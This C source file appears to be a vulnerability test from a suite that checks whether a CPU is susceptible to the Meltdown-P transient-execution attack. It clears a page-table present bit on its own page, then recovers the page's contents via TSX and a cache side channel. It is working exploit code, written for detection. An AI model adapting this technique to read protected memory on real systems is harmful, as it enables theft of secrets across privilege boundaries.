#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "libpte/ptedit_header.h"
#include "libcache/cache.h"
#include "lib/global.h"

char *victim_page;

int main(int argc, char **argv)
{
    PREPARE();
    // Initialize PTEditor to manipulate page table entries
    if (ptedit_init())
    {
        perror("ptedit_init");
        printf(ANSI_COLOR_YELLOW "Meltdown_P: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // We need a shared mapping. One mapping gets P bit cleared..
    // The second one remains valid to keep data in the cache as it works better.
    // 对shm_open未定义的引用，解决办法：编译选项加上-lrt
    int shm = shm_open("shared_mapping", O_CREAT | O_RDWR, 0644);
    if (shm == -1)
    {
        perror("shm_open");
        printf(ANSI_COLOR_YELLOW "Meltdown_P: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // Set memory objects size
    if (ftruncate(shm, 4096 * 2) == -1)
    {
        perror("ftruncate");
        printf(ANSI_COLOR_YELLOW "Meltdown_P: Error" ANSI_COLOR_RESET "\n");
        exit(-1);
    }

    // Victim mapping that gets P bit cleared
    victim_page = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                               MAP_SHARED, shm, 0);

    // Mapping for keeping data in the cache
    char *accessor = (char *)mmap(NULL, pagesize, PROT_READ | PROT_WRITE,
                                  MAP_SHARED, shm, 0);

    // Write data we want to recover to our victim page
    memset(victim_page, 'S', pagesize * sizeof(char));
    // Clear P bit of our victim page
    ptedit_pte_clear_bit(victim_page, 0, PTEDIT_PAGE_BIT_PRESENT);

    // Flush our shared memory
    flush_shared_memory();
    start_time = time(NULL);
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // Load data into the cache and fence
        maccess(accessor);
        mfence();
        //Start TSX transaction if available on CPU
        if (try_start())
        {
            // Null pointer access prolongs transient window
            maccess(0);
            // Perform access based on unauthorized data
            maccess(mem + *victim_page * 4096);
            try_abort();
        }
        try_end();

        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_P: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_P: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_P: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    munmap(victim_page, pagesize);
    munmap(accessor, pagesize);
    ptedit_cleanup();
    exit(exit_result);
}